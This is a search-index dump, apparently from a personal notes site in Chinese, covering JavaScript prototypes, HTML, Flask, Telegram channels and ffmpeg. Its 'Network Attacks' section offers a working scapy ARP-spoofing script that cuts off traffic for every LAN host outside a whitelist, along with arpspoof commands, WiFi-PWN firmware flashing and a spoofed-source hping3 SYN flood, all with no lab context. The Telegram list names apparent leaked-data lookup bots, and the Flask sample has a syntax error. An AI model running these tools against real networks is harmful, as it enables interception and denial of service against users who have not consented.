</ul> <ul> <li>Issue with Simple Constructors and Methods\uff1a\u5728\u4e0a\u9762\u7684 <code>Drink</code> \u793a\u4f8b\u4e2d\uff0c\u6bcf\u6b21\u521b\u5efa <code>Drink</code> \u5bf9\u8c61\u65f6\uff0c\u90fd\u4f1a\u4e3a <code>getPrice</code> \u521b\u5efa\u5e76\u5206\u914d\u4e00\u4e2a \u65b0 \u51fd\u6570\u5bf9\u8c61\u7ed9\u8be5\u5b9e\u4f8b\u3002\u5982\u679c\u6240\u6709\u5b9e\u4f8b\u7684\u65b9\u6cd5\u903b\u8f91\u76f8\u540c\uff0c\u5219\u6548\u7387\u4f4e\u4e0b\u3002Prototypes \u63d0\u4f9b\u4e86\u4e00\u79cd\u5171\u4eab\u65b9\u6cd5\u7684\u65b9\u6cd5\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#7-prototypes-oop","title":"7. Prototypes \u548c OOP","text":"<p>\u7684 OOP (Object-Oriented Programming) \u65b9\u6cd5\u4e0d\u540c\u4e8e\u50cf Java \u6216 C# \u8fd9\u6837\u7684 class-based \u8bed\u8a00\u3002\u5b83\u4f7f\u7528\u57fa\u4e8e prototype \u7684\u7cfb\u7edf\u3002</p> <ul> <li>Prototype-Based Programming\uff1a\u4f20\u7edf\u610f\u4e49\u4e0a\u6ca1\u6709\u663e\u5f0f\u7684 classes (ES6 <code>class</code> syntax \u662f prototypes \u4e4b\u4e0a\u7684 syntactic sugar)\u3002</li> <li>\u884c\u4e3a\u91cd\u7528\uff08inheritance\uff09\u662f\u901a\u8fc7\u5bf9\u8c61\u4ece\u5176 prototype \u5bf9\u8c61\u7ee7\u627f\u5c5e\u6027\u548c\u65b9\u6cd5\u6765\u5b9e\u73b0\u7684\u3002</li> <li>\u5bf9\u8c61\u662f\u901a\u8fc7\u201ccloning\u201d\u6216\u94fe\u63a5\u5230\u73b0\u6709\u5bf9\u8c61\uff08prototypes\uff09\u6765\u521b\u5efa\u7684\u3002</li> <li>\u4e5f\u79f0\u4e3a class-less\u3001prototype-oriented \u6216 instance-based \u7684\u7f16\u7a0b\u3002</li> </ul>"},{"location":"cs/mern/3403/w4/#71-prototypes","title":"7.1 \u4f7f\u7528 Prototypes \u91cd\u7528\u51fd\u6570","text":"<p>\u4e3a\u4e86\u907f\u514d\u4e3a\u6bcf\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\u590d\u5236\u51fd\u6570\uff0c\u53ef\u4ee5\u5c06\u65b9\u6cd5\u6dfb\u52a0\u5230\u6784\u9020\u51fd\u6570\u7684 <code>prototype</code> property \u4e2d\u3002</p> <ul> <li>\u4e2d\u7684\u6bcf\u4e2a\u51fd\u6570\u90fd\u81ea\u52a8\u62e5\u6709\u4e00\u4e2a <code>prototype</code> property\uff0c\u5b83\u662f\u4e00\u4e2a\u5bf9\u8c61\u3002</li> </ul> <ul> <li>\u5f53\u51fd\u6570\u4e0e <code>new</code> \u4e00\u8d77\u7528\u4f5c\u6784\u9020\u51fd\u6570\u65f6\uff0c\u65b0\u521b\u5efa\u7684\u5bf9\u8c61\u4f1a\u83b7\u5f97\u4e00\u4e2a\u5230\u6784\u9020\u51fd\u6570\u7684 <code>prototype</code> \u5bf9\u8c61\u7684\u5185\u90e8\u94fe\u63a5\uff08\u901a\u5e38\u79f0\u4e3a <code>[[Prototype]]</code> \u6216 <code>__proto__</code>\uff09\u3002</li> </ul> <ul> <li> <p>Prototype Chain\uff1a\u5f53\u4f60\u5c1d\u8bd5\u8bbf\u95ee\u5bf9\u8c61\u4e0a\u7684\u5c5e\u6027\u65f6\uff1a</p> <ol> <li> <p>\u9996\u5148\u68c0\u67e5\u5bf9\u8c61\u672c\u8eab\u662f\u5426\u76f4\u63a5\u62e5\u6709\u8be5\u5c5e\u6027\u3002</p> </li> <li> <p>\u5982\u679c\u672a\u627e\u5230\uff0c\u5219\u68c0\u67e5\u5bf9\u8c61\u7684 prototype\u3002</p> </li> <li> <p>\u5982\u679c\u4ecd\u672a\u627e\u5230\uff0c\u5219\u68c0\u67e5 prototype \u7684 prototype\uff0c\u4f9d\u6b64\u7c7b\u63a8\uff0c\u5f62\u6210\u4e00\u4e2a\u201cprototype chain\u201d\u3002</p> <p>\u6b64\u94fe\u5c06\u7ee7\u7eed\uff0c\u76f4\u5230\u627e\u5230\u8be5\u5c5e\u6027\u6216\u5230\u8fbe\u94fe\u7684\u672b\u5c3e\uff08\u901a\u5e38\u662f Object.prototype\uff0c\u5176\u81ea\u8eab\u7684 prototype \u4e3a null\uff09\u3002</p> </li> </ol> </li> </ul> <ul> <li> <p>\u5411 Prototype \u6dfb\u52a0\u65b9\u6cd5\uff1a</p> <pre><code>function Drink(basePrice) {\n    this.basePrice = basePrice; // \u5b9e\u4f8b\u7279\u5b9a\u7684\u5c5e\u6027\n}\n// \u5c06 getPrice \u6dfb\u52a0\u5230 Drink.prototype \u4ee5\u4fbf\u6240\u6709 Drink \u5b9e\u4f8b\u5171\u4eab\u5b83\nDrink.prototype.getPrice = function() {\n    let tax = 1.125; // \u793a\u4f8b\u7a0e\u7387\n    return this.basePrice * tax; // 'this' \u5c06\u6b63\u786e\u5f15\u7528\u8c03\u7528 getPrice \u7684\u5b9e\u4f8b\n};\n\nlet amberPearlLatte = new Drink(10);\nlet winterMelonTea = new Drink(11);\nconsole.log(amberPearlLatte.getPrice()); // \u6709\u6548\uff01\u5728 Drink.prototype \u4e0a\u67e5\u627e getPrice\nconsole.log(winterMelonTea.getPrice());  // \u4e5f\u6709\u6548\uff0c\u4f7f\u7528\u76f8\u540c\u7684\u5171\u4eab\u51fd\u6570\n</code></pre> <p>\u73b0\u5728\uff0camberPearlLatte \u548c winterMelonTea \u6ca1\u6709\u81ea\u5df1\u7684 getPrice \u5c5e\u6027\u3002\u5f53\u8c03\u7528 amberPearlLatte.getPrice() \u65f6\uff0c\u4f1a\u6cbf\u7740 prototype chain \u67e5\u627e\u5230 Drink.prototype \u5e76\u5728\u90a3\u91cc\u627e\u5230\u5b83\u3002</p> <p>Object.prototype \u662f\u5927\u591a\u6570 prototype chains \u7684\u6839\u3002</p> </li> </ul>"},{"location":"cs/mern/3403/w4/#72-prototypes","title":"7.2 \u8fd0\u884c\u65f6\u5411 Prototypes \u6dfb\u52a0\u65b9\u6cd5","text":"<p>Banana Skin / \u5f3a\u5927\u529f\u80fd\uff1aPrototypes \u53ef\u4ee5\u5728\u7a0b\u5e8f\u6267\u884c\u671f\u95f4\u7684 \u4efb\u4f55\u65f6\u5019 \u8fdb\u884c\u4fee\u6539\u3002\u8fd9\u610f\u5473\u7740\u4f60\u53ef\u4ee5\u5411 prototype \u6dfb\u52a0\u65b0\u65b9\u6cd5\uff0c\u6240\u6709\u4ece\u8be5 prototype \u7ee7\u627f\u7684\u73b0\u6709\u5bf9\u8c61\uff08\u4ee5\u53ca\u5c06\u6765\u7684\u5bf9\u8c61\uff09\u90fd\u5c06\u7acb\u5373\u83b7\u5f97\u5bf9\u8fd9\u4e9b\u65b0\u65b9\u6cd5\u7684\u8bbf\u95ee\u6743\u9650\u3002</p> <ul> <li> <p>\u793a\u4f8b\uff1a\u5411 <code>String.prototype</code> \u6dfb\u52a0 <code>reversed</code> \u65b9\u6cd5\uff1a</p> <pre><code>const s = \"live on\"; // \u4e00\u4e2a\u73b0\u6709\u7684\u5b57\u7b26\u4e32\u5b9e\u4f8b\n// \u5411\u6240\u6709\u5b57\u7b26\u4e32\u7684 prototype \u6dfb\u52a0\u4e00\u4e2a\u65b0\u65b9\u6cd5\nString.prototype.reversed = function() {\n    let r = \"\";\n    for (var i = this.length - 1; i &gt;= 0; i--) {\n        r += this[i];\n    }\n    return r;\n};\nconsole.log(s.reversed()); // \u8f93\u51fa: \"no evil\"\n                           // 's' \u73b0\u5728\u53ef\u4ee5\u4f7f\u7528 'reversed'\uff0c\u5373\u4f7f\u5b83\u662f\u5728 'reversed' \u88ab\u6dfb\u52a0\u5230 prototype \u4e4b\u524d\u521b\u5efa\u7684\u3002\n                           // \u67e5\u627e\u662f\u5728\u8fd0\u884c\u65f6\u8fdb\u884c\u7684\u3002\nconsole.log(\"another string\".reversed()); // \u4e5f\u6709\u6548\n</code></pre> </li> </ul> <ul> <li>Inheritance\uff1aPrototypes \u662f\u4e2d\u5b9e\u73b0\u7ee7\u627f\u7684\u673a\u5236\u3002\u201csubclass\u201d\uff08\u6784\u9020\u51fd\u6570\uff09\u53ef\u4ee5\u5c06\u5176 prototype \u8bbe\u7f6e\u4e3a\u201csuperclass\u201d\u6784\u9020\u51fd\u6570\u7684\u5b9e\u4f8b\uff0c\u6216\u8005\u66f4\u5e38\u89c1\u7684\u662f\uff0c\u4f7f\u7528 <code>Object.create()</code> \u6765\u94fe\u63a5 prototypes\u3002</li> </ul> <p>\u672c\u6307\u5357\u7684\u4e0b\u4e00\u90e8\u5206\u5c06\u7ee7\u7eed\u4ecb\u7ecd Variable Scoping \u548c Closures\u3002</p>"},{"location":"cs/mern/html/html_syntax/","title":"1.0 HTML Basic Syntax","text":""},{"location":"cs/mern/html/html_syntax/#shortcut","title":"Shortcut","text":"<ul> <li>! \u52a0 return \u5feb\u901f\u5f97\u5230 html \u524d\u7f00</li> <li>shift + \u4e0a\u4e0b\u5de6\u53f3\u53ef\u4ee5\u9009\u62e9\u6587\u672c</li> <li>shift + option + \u4e0b\uff0c\u5411\u4e0b\u7c98\u8d34</li> </ul>"},{"location":"cs/mern/html/html_syntax/#headers","title":"Headers","text":"<pre><code>&lt;h1&gt;hello world&lt;/h1&gt;\n</code></pre> <ul> <li>\u8fd9\u6837\u7684\u6574\u4f53\u53eb element, <code>&lt;h1&gt;</code> \u548c <code>&lt;/h1&gt;</code> \u5206\u522b\u4e3a opening \u548c closing tag</li> <li>header \u53ea\u6709 <code>&lt;h1&gt;</code> -  <code>&lt;h6&gt;</code></li> </ul>"},{"location":"cs/mern/html/html_syntax/#paragraphs","title":"Paragraphs","text":"<p>Lorem Ipsum \u662f\u4e00\u79cd\u7528\u4e8e\u6392\u7248\u548c\u8bbe\u8ba1\u7684\u5047\u6587\uff0c\u901a\u5e38\u88ab\u7528\u4f5c\u5360\u4f4d\u7b26\u6587\u672c\u3002\u5176\u76ee\u7684\u662f\u5728\u8bbe\u8ba1\u6837\u672c\u4e2d\u63d0\u4f9b\u4e00\u4e2a\u6587\u672c\u586b\u5145\uff0c\u4ee5\u4fbf\u5728\u6ca1\u6709\u5b9e\u9645\u5185\u5bb9\u7684\u60c5\u51b5\u4e0b\u6a21\u62df\u6587\u672c\u7684\u5916\u89c2\u548c\u5e03\u5c40\u3002\u8fd9\u5bf9\u4e8e\u68c0\u67e5\u5b57\u4f53\u3001\u6392\u7248\u548c\u6574\u4f53\u8bbe\u8ba1\u6548\u679c\u975e\u5e38\u6709\u7528\u3002</p> <p>Lorem Ipsum \u7684\u6765\u6e90\u53ef\u4ee5\u8ffd\u6eaf\u5230\u53e4\u7f57\u9a6c\u65f6\u671f\u7684\u62c9\u4e01\u6587\u5b66\uff0c\u7279\u522b\u662f\u516c\u5143\u524d45\u5e74\u5de6\u53f3\u897f\u585e\u7f57\uff08Cicero\uff09\u7684\u8457\u4f5c\u300a\u5584\u4e0e\u6076\u7684\u7ec8\u6781\u7406\u8bba\u300b\uff08\"De finibus bonorum et malorum\"\uff09\u3002\u867d\u7136\u5b83\u662f\u62c9\u4e01\u6587\uff0c\u4f46 Lorem Ipsum \u5e76\u6ca1\u6709\u5b9e\u9645\u610f\u4e49\uff0c\u4ec5\u4ec5\u662f\u4e00\u79cd\u6a21\u62df\u6587\u672c\u7684\u5de5\u5177\u3002</p> <p>\u73b0\u4ee3\u8bbe\u8ba1\u548c\u5f00\u53d1\u5de5\u5177\u4e2d\uff0cLorem Ipsum \u7ecf\u5e38\u88ab\u7528\u6765\u586b\u5145\u6587\u672c\u6846\u3001\u6587\u7ae0\u548c\u6bb5\u843d\uff0c\u5e2e\u52a9\u8bbe\u8ba1\u5e08\u548c\u5f00\u53d1\u8005\u4e13\u6ce8\u4e8e\u5e03\u5c40\u548c\u529f\u80fd\uff0c\u800c\u4e0d\u662f\u5185\u5bb9\u3002</p> <p>www.lipsum.co \u6216\u8005\u81ea\u5df1 Google Funny Lorem Ipsum</p>"},{"location":"cs/mern/html/html_syntax/#void-element","title":"Void Element","text":"<pre><code>&lt;hr /&gt;\n&lt;br /&gt; \n</code></pre> <p>\u4ee5\u4e0a\u4e24\u79cd tag \u5206\u522b\u53eb horizontal rule \u548c break element\uff0c\u73b0\u4ee3\u7f51\u9875\u5f00\u53d1\u4e2d HTML \u81ea\u52a8\u5ffd\u7565\u7a7a\u683c\u548c / \u7b26\u53f7\uff0c\u76f4\u63a5\u4f7f\u7528 <code>&lt;hr&gt;</code> \u548c <code>&lt;br&gt;</code> \u5373\u53ef\uff0c\u4f46\u524d\u8005\u66f4\u4e3a\u6807\u51c6\u3002</p> <p>\u5728 paragraph \u4e2d\u7a7a\u884c\u6700\u597d\u4f7f\u7528\u591a\u4e2a <code>&lt;p&gt;</code> tag, \u4e2d\u95f4\u7a7f\u63d2 <code>&lt;br&gt;</code> \u4f1a\u5bfc\u81f4\u76f2\u4eba\u9605\u8bfb\u56f0\u96be</p>"},{"location":"cs/python/flask/1.0/","title":"1.0 Quick Start","text":""},{"location":"cs/python/flask/1.0/#theory","title":"Theory","text":"<ul> <li>Client-Side = Restaurant</li> <li>Server = Kitchen</li> <li>Database = Larder</li> </ul> <p>\u7f51\u7ad9\u5c31\u50cf\u4e00\u5bb6\u9910\u5385\uff0c\u670d\u52a1\u5458\u548c\u53a8\u5e08\u4ece\u6570\u636e\u5e93\u4e2d\u62ff\u53d6\u6570\u636e\u8fdb\u884c\u52a0\u5de5\u6e32\u67d3\u91cd\u65b0\u7ec4\u5408\u6210\u65b0\u7684 HTML CSS \u548c JS \u6587\u4ef6\u5448\u73b0\u7ed9\u7528\u6237</p> <ul> <li>Framework \u548c Library \u6700\u5927\u7684\u533a\u522b\u5c31\u662f\u4f60\u5fc5\u987b\u6309\u7167\u6846\u67b6\u7684\u89c4\u5219\u8fdb\u884c\u7f16\u7a0b</li> </ul>"},{"location":"cs/python/flask/1.0/#basics","title":"Basics","text":"Flask Import<pre><code>from flask import Flask\n\napp = Flask(__name__)\n\nprint(__name__) # (1)!\n</code></pre> <p>Flask \u5f53\u4e2d\u7684 <code>__name__</code> \u7528\u4e8e\u786e\u5b9a\u5e94\u7528\u5f53\u524d\u4f4d\u7f6e\uff0c\u8fd9\u91cc\u5982\u679c\u76f4\u63a5\u6253\u5370 <code>__name__</code> \u4f1a\u663e\u793a <code>__main__</code> </p> <p><code>__main__</code> is the name of the scope in which top-level code executes. A module's <code>__name__</code> is set equal to <code>__main__</code> when read from standard input, a script, or from an interactive prompt.</p> <pre><code>if __name__ = \"__main__\":\n    main()\n</code></pre> <p>\u53ea\u6709\u5f53\u5b83\u4f5c\u4e3a\u4e00\u4e2a\u811a\u672c\u8fd0\u884c\u65f6\u624d\u4f1a\u6267\u884c</p>"},{"location":"cs/python/flask/1.0/#_1","title":"\u8def\u7531","text":"<p>\u5ba2\u6237\u7aef\uff08\u4f8b\u5982 Web \u6d4f\u89c8\u5668\uff09\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Web \u670d\u52a1\u5668\uff0cWeb \u670d\u52a1\u5668\u518d\u628a\u8bf7\u6c42\u53d1\u9001\u7ed9 Flask \u5e94\u7528\u5b9e\u4f8b\u3002\u5e94\u7528\u5b9e\u4f8b\u9700\u8981\u77e5\u9053\u5bf9\u6bcf\u4e2a URL \u7684\u8bf7\u6c42\u8981\u8fd0\u884c\u54ea\u4e9b\u4ee3\u7801\uff0c\u6240\u4ee5\u4fdd\u5b58\u4e86\u4e00\u4e2a URL \u5230 Python \u51fd\u6570\u7684\u6620\u5c04\u5173\u7cfb\u3002\u5904\u7406 URL \u548c\u51fd\u6570\u4e4b\u95f4\u5173\u7cfb\u7684\u7a0b\u5e8f\u79f0\u4e3a\u8def\u7531\u3002</p> <pre><code>@app.route('/')\ndef index():\n    return 'Hello World!'\n\n@app.route('/user/&lt;name&gt;')\ndef user(name):\n    return 'Hello, {}!'.format(name)\n</code></pre> <p>\u5c16\u62ec\u53f7\u91cc\u7684\u5185\u5bb9\u5c31\u662f\u52a8\u6001\u90e8\u5206\uff0cFlask \u4f1a\u5c06\u52a8\u6001\u90e8\u5206\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u51fd\u6570\uff1a</p> <p>\u8def\u7531 <code>/user/&lt;int:id&gt;</code> \u53ea\u4f1a\u5339\u914d\u52a8\u6001\u7247\u6bb5\uff0c\u8def\u7531\u4e2d\u652f\u6301 string, float \u548c path \u7c7b\u578b</p>"},{"location":"cs/python/flask/1.0/#python-decorators","title":"Python Decorators","text":"<pre><code># Functions can be nested in other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n\n    nested_function()  \nouter_function()\n\n# Functions can be returned from other functions\n\ndef outer_function():\n    print(\"I'm outer\")\n\n    def nested_function():\n        print(\"I'm inner\")\n    return nested_function\n\ninner_function = outer_function()\ninner_function()\n</code></pre>"},{"location":"cs/python/flask/1.0/#_2","title":"\u542f\u52a8\u65b9\u6cd5","text":"<p>\u6307\u4ee4\u884c\u542f\u52a8\uff1a</p> <pre><code>set FLASK_APP=hello.py\nflask run\n</code></pre> <p>\u5355\u5143\u6d4b\u8bd5\u8c03\u8bd5\uff1a</p> <pre><code>set FLASK_APP=hello.py\nset FLASK_DEBUG=1\nflask run\n</code></pre> <p>\u6216\u5728\u4ee3\u7801\u5185\u90e8\u76f4\u63a5\u5b9a\u4e49\u8c03\u8bd5</p> <pre><code>if __name__ == '__main__':\n    app.run(debug=True)\n</code></pre> <p>\u91cd\u8f7d\u5668\u548c\u8c03\u8bd5\u5668\u4f1a\u81ea\u52a8\u68c0\u6d4b\u4ee3\u7801\u53d8\u52a8\u5728 Web \u7aef\u629b\u51fa\u5f02\u5e38</p> <p><code>flask run</code> \u7684\u8be6\u7ec6\u62d3\u5c55\u53c2\u6570\u76f4\u63a5\u8f93\u5165 <code>flask --help</code> \u76f4\u63a5\u67e5\u770b\u5373\u53ef</p>"},{"location":"cyber/networkattack/","title":"Network Attacks","text":""},{"location":"cyber/networkattack/#arp-spoofing","title":"Arp Spoofing","text":""},{"location":"cyber/networkattack/#python-script","title":"Python Script","text":"<p>\u57fa\u4e8e\u767d\u540d\u5355\u5217\u8868\u8fdb\u884c ARP IP \u6bb5\u6d41\u91cf\u963b\u65ad</p> <pre><code>import scapy.all as scapy\nimport time\n\ndef scan_network(ip_range):\n    arp_request = scapy.ARP(pdst=ip_range)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    active_ips = []\n    for element in answered_list:\n        active_ips.append(element[1].psrc)\n    return active_ips\n\ndef get_mac(ip):\n    arp_request = scapy.ARP(pdst=ip)\n    broadcast = scapy.Ether(dst=\"ff:ff:ff:ff:ff:ff\")\n    arp_request_broadcast = broadcast / arp_request\n    answered_list = scapy.srp(arp_request_broadcast, timeout=5, verbose=False)[0]\n    if answered_list:\n        return answered_list[0][1].hwsrc\n    else:\n        return None\n\ndef spoof(target_ip, spoof_ip):\n    target_mac = get_mac(target_ip)\n    if target_mac is not None:\n        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)\n        scapy.send(packet, verbose=False)\n\ndef restore(destination_ip, source_ip):\n    destination_mac = get_mac(destination_ip)\n    source_mac = get_mac(source_ip)\n    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)\n    scapy.send(packet, verbose=False)\n\n# Replace these with the actual IP range and exclusion list\nip_range = \"192.168.1.0/24\"\ngateway_ip = \"192.168.1.1\"\nexclusion_list = [\"192.168.1.1\", \"192.168.1.4\", \"192.168.1.6\"]\n\ntry:\n    active_ips = scan_network(ip_range)\n    target_ips = [ip for ip in active_ips if ip not in exclusion_list]\n    sent_packets_count = 0\n    print(active_ips)\n    while True:\n        for target_ip in target_ips:\n            spoof(target_ip, gateway_ip)\n            spoof(gateway_ip, target_ip)\n            sent_packets_count = sent_packets_count + 2\n            print(f\"\\\\r[*] Packets Sent to {target_ip} -&gt; \" + str(sent_packets_count), end=\"\")\n        time.sleep(1) # Waits for two seconds\n\nexcept KeyboardInterrupt:\n    print(\"\\\\nCtrl + C pressed.............Exiting\")\n    for target_ip in target_ips:\n        restore(gateway_ip, target_ip)\n        restore(target_ip, gateway_ip)\n    print(\"[+] Arp Spoof Stopped\")\n</code></pre>"},{"location":"cyber/networkattack/#quick-spoofing-on-linux","title":"Quick spoofing on Linux","text":"<pre><code>apt install dsniff\nnmap -sP 192.168.86.1/26\nsysctl -w net.ipv4.ip_forward=0\nsudo arpspoof -i wlan0 -t 192.168.86.30 -r 192.168.86.1\n</code></pre>"},{"location":"cyber/networkattack/#wifi-clone","title":"WIFI Clone","text":""},{"location":"cyber/networkattack/#esp8266-mcu-wifi-pwn","title":"ESP8266 MCU \u70e7\u5f55 WIFI-PWN","text":"<pre><code>pip install esptool\nesptool.py --port COM5 erase_flash\nesptool.py --port COM5 --baud 115200 write_flash -fm dio -fs 32m 0x00000 NODEMCU.bin\n</code></pre>"},{"location":"cyber/networkattack/#tcp-syn-flood","title":"TCP SYN Flood","text":"<p>\u4e3b\u8981\u4f7f\u7528 HPING3 \u5de5\u5177\u8fdb\u884c DOS \u653b\u51fb\uff1a\u4f2a\u9020 IP\u3001\u76ee\u6807 IP</p> <pre><code>hping3 -c 5000 -d 1024 -S -w 64 -p 21 --flood -a 192.168.10.254 192.168.10.120\n</code></pre>"},{"location":"handbook/csplan/","title":"CS Study Plan","text":"<p>Matt Rickard Hire for slope, not Y-Intercept.</p>"},{"location":"handbook/csplan/#stanford","title":"Stanford","text":"Course Description CS106A CS106B YouTube Lecture CS107 YouTube Lecture CS103 MIT Mathematics for Computer Science or Coursera CS161 Design and Analysis, Part 1  + Design and Analysis, Part 2 CS110 CS145 edX Compilers CS143 CS144 YouTube Lecture Video CS140 UCB https://cs162.org/ + YouTube Lecture Video Elective CS246 CS253 CS255 <ul> <li>Use https://online.stanford.edu to research the course you study first</li> <li>Check https://www.edx.org/school/stanfordonline for what you are interesting for</li> </ul>"},{"location":"handbook/csplan/#uc-san-diego","title":"UC San Diego","text":"Course Description CSE 15L A Practical Guide to Linux Commands, Editors, and Shell Programming CSE 20 Discrete Mathematics and its Applications from Kenneth Rosen &amp; Daniel Solow - How to Read and Do Proofs CSE 21 Google Drive Backup CSE 30 Stepik open course, can't use the pi-cluster CSE 140 Google Drive Backup, zybook extend one year CSE 140L Google Drive Backup CSE 100 Stepik rysnc reading CSE 101 Google Drive Backup CSE 105 Google Drive Backup MGT 172 Google Drive Backup SOCI 117 Google Drive Backup <ul> <li>Try use Latex to finish homework.</li> <li>Check your alterative textbook database before study.</li> </ul>"},{"location":"handbook/csplan/#uc-santa-cruz","title":"UC Santa Cruz","text":"Course Description CSE 130 Principles of Computer Systems Design CSE 120 Computer Architecture CSE 102 Introduction to Analysis of Algorithms CSE 185S Technical Writing for Computer Science and Engineering CSE 107 Probability and Statistics for Engineers CSE 116 Introduction to Functional Programming Elective Elective Elective Capstone elective Elective CSE 103 Computational Models"},{"location":"handbook/telegram/","title":"Telegram Guide","text":"<p>Immanuel Kant Freedom is not letting you do whatever you wanna but teaching you not to do the things you don't wanna do.<sup>1</sup></p>"},{"location":"handbook/telegram/#seo","title":"SEO","text":"<ul> <li>Telemetr.io</li> </ul> <p>Google <code>site:telemetr.io \u8d44\u6e90\u641c\u7d22\u5173\u952e\u8bcd</code></p>"},{"location":"handbook/telegram/#bots","title":"Bots","text":"<p>@gpt4bot</p> <p>@myidbot</p> <p>@scihubot</p> <p>@soundcloud_youtube_music_bot</p> <p>@Music163bot</p> <p>@bingdict_bot</p> <p>@web2album_bot</p> <p>@yihong0618_bot</p> <p>@yellow_gif_bot</p> <p>@DogeSGK_bot</p> <p>@PolarisseekBot</p> <p>@sgk2023_03_30bot</p> <p>@CopilotOfficialBot</p> <p>@reverse_image_search_bot</p> <p>@zh_secretary_bot</p> <p>@GLBetabot</p> <p>@PyrogramBot</p>"},{"location":"handbook/telegram/#tech","title":"Tech","text":"<ul> <li>\u82b1\u679c\u5c71\u5927\u5723\u8fdc\u7a0b\u5de5\u4f5c</li> <li>PagerMaid-Modify Update</li> <li>iOS \u7834\u89e3\u81ea\u7b7e\u8f6f\u4ef6\u5305</li> <li>\u5999\u5999\u5c0f\u5de5\u5177\u53d1\u5e03\u9891\u9053</li> </ul>"},{"location":"handbook/telegram/#runology","title":"Runology","text":"<ul> <li>\u6d41\u6d6a\u9632\u533a</li> </ul> <p>Reddit \u8bba\u575b\u5206\u652f\u8ba8\u8bba\u793e\u533a @china_irl</p> <ul> <li>Runology Group</li> </ul> <p>\u4e3b\u653b\u6da6\u5b66\u5206\u4eab\uff0c\u7fa4\u91cc\u5f88\u591a\u6da6\u5b66\u7406\u8bba\u5bb6\u53ef\u4ee5\u54a8\u8be2</p>"},{"location":"handbook/telegram/#sociology","title":"Sociology","text":"<ul> <li>Iyouport</li> </ul> <p>\u81ea\u7531\u6e2f\u65b0\u95fb\u5e2e\uff0c\u793e\u4f1a\u5b66\u89c2\u5bdf\u4e0e\u89e3\u6784</p> <ul> <li>TomBen\u2019s Web Excursions</li> </ul> <p>Social Science Ph.D. - \u793e\u4f1a\u77db\u76fe\u8bba\u6587\u89e3\u8bfb\uff0c\u5b9e\u9a8c\u6570\u636e\u5206\u4eab\uff0c\u5df2\u505c\u66f4</p> <ul> <li>\u5fae\u4fe1\u642c\u8fd0\u5de5 - @wxbyg</li> <li>JUST A PEEK - @justapeek</li> <li>\u4e2d\u82f1\u6587\u4ed8\u8d39\u671f\u520a\u5206\u53d1 - @Qikan2023</li> <li>\u6cd5\u62c9\u76db\u7f8e\u7c4d\u6d41\u6d6a\u6c49 - @youyaodaofanlexdm</li> </ul>"},{"location":"handbook/telegram/#entertainment","title":"Entertainment","text":"<ul> <li>\u5c0f\u7ea2\u4e66\u4e00\u77a5</li> <li>\u590d\u5236\u7c98\u8d34 - @fuzhizhantie6324</li> <li>\u6d6a\u4eba\u65b0\u95fb \u5bfc\u6f14\u526a\u8f91\u7248 - @RoninShinbun</li> </ul>"},{"location":"handbook/telegram/#ai","title":"AI","text":"<ul> <li>AI Copilot Channel</li> </ul> <ol> <li> <p>Immanuel Kant \u5bf9\u4e8e\u81ea\u7531\u7684\u5b9a\u4e49 \u21a9</p> </li> </ol>"},{"location":"tools/ffmpeg/","title":"FFMPEG","text":""},{"location":"tools/ffmpeg/#shortcuts","title":"Shortcuts","text":""},{"location":"tools/ffmpeg/#_1","title":"\u7f51\u7edc\u4e32\u6d41\u4fdd\u5b58","text":"<pre><code>ffmpeg -i \"&lt;https://somem3u8linkfromwebsite.master.m3u8&gt;\" -c:v libx264 -preset slow -crf 22 \"save.mp4\"\n</code></pre>"},{"location":"tools/ffmpeg/#_2","title":"\u89c6\u9891\u7247\u6bb5\u88c1\u526a","text":"<pre><code>ffmpeg -ss 00:00:00 -t 00:00:30 -i input.mp4 -vcodec copy -acodec copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_3","title":"\u6309\u7167\u89c6\u9891\u5e8f\u53f7\u5408\u5e76","text":"<p>\u5728\u6587\u4ef6\u5939\u4e0b\u6309\u7167\u6570\u5b57\u6392\u5e8f\u6587\u4ef6\u540e\u76f4\u63a5\u5408\u5e76\uff0c\u9002\u7528\u4e8e m3u8 \u7b49\u6587\u4ef6\u88ab\u5206\u6bb5\u4fdd\u62a4\u540e\u7684\u5408\u5e76\u91cd\u7ec4</p> <pre><code>ffmpeg -safe 0 -f concat -i &lt;(find \"$PWD\" -name '*.mp4' -printf \"file '%p'\\\\\\\\n\" | sort) -c copy output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_4","title":"\u89c6\u9891\u6279\u91cf\u8f6c\u6362\u683c\u5f0f","text":"<pre><code>for i in *.flv;\n  do name=`echo \"$i\" | cut -d'.' -f1`\n  echo \"$name\"\n  ffmpeg -i \"$i\" \"${name}.mp4\"\ndone\n</code></pre>"},{"location":"tools/ffmpeg/#mp4","title":"\u97f3\u9891\u5d4c\u5165 MP4 \u89c6\u9891","text":"<pre><code>ffmpeg -i input.mp4 -i input.mp3 -c copy -map 0:v:0 -map 1:a:0 output.mp4 \n</code></pre>"},{"location":"tools/ffmpeg/#mp4-srt","title":"MP4 \u5e95\u90e8\u5d4c\u5165 SRT \u5b57\u5e55","text":"<pre><code>ffmpeg -i input.mp4 -vf subtitles=subtitles.srt output.mp4\n</code></pre>"},{"location":"tools/ffmpeg/#_5","title":"\u6709\u635f\u538b\u7f29","text":"<pre><code>ffmpeg -i input.mp4 -c:v libx264 -tag:v avc1 -movflags faststart -crf 30 -preset superfast output.mp4\n</code></pre> <p><code>-c:v libx264</code> \u4e3b\u6d41\u3001\u9ad8\u6548\u7684 H.264 \u538b\u7f29\u7f16\u7801\u3002</p> <p><code>-movflags faststart</code> \u5143\u6570\u636e\u524d\u7f6e\uff0c\u89c6\u9891\u8fd8\u672a\u5b8c\u5168\u4e0b\u8f7d\u65f6\uff0c\u5c31\u53ef\u4ee5\u5f00\u59cb\u64ad\u653e\u3002</p> <p><code>-crf 30</code> \u52a8\u6001\u7801\u5f8b\uff0c\u5927\u5e45\u538b\u7f29\u7684\u5173\u952e\u3002</p> <p><code>-preset superfast</code> 